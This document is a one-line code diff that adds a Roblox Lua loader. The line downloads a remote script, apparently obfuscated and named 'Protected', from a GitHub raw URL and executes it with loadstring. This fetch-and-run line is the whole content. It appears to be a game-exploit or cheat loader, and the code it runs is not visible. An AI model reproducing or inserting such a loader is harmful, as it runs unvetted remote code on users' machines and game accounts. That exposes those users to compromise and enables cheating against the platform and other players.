@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/OfficialSolarFlare/NexusX/main/Protected_9691923056636055.lua'))()
